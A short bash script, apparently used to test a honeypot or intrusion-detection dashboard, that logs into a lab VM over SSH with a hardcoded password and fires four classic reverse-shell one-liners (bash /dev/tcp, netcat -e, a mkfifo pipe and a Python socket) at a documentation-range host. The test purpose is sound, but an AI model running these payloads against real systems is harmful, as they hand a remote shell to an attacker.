#!/usr/bin/env bash
# Reverse Shell Attack
# Bash /dev/tcp, netcat -e, python socket, mkfifo — establishing outbound shell connections.
#
# Usage:  scripts/attack-reverse-shell.sh [VM-IP]
# Default VM IP: 192.168.1.79
#
# Dashboard: http://<VM-IP>:5173
# What to look for: reverse_shell category, high risk, /dev/tcp in commands

set -euo pipefail
IP="${1:-192.168.1.79}"
echo ""
echo "==================================================================="
echo "  Reverse Shell Attack"
echo "==================================================================="
echo "  Target:    $IP:2222"
echo "  Category:  reverse_shell"
echo "==================================================================="
echo ""

sshpass -p "password" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o ConnectTimeout=10 \
  -p 2222 \
  root@$IP \
  "bash -i >& /dev/tcp/198.51.100.1/4444 0>&1 ; nc -e /bin/sh 198.51.100.1 5555 ; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 198.51.100.1 6666 > /tmp/f ; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("198.51.100.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'" 2>&1 || true

echo ""
echo "  ✓ Attack complete"
echo "  → Dashboard:  http://$IP:5173"
echo "  → API check:  curl -s http://$IP:5000/api/events?attack_category=reverse_shell&limit=3 | python3 -m json.tool"
echo ""
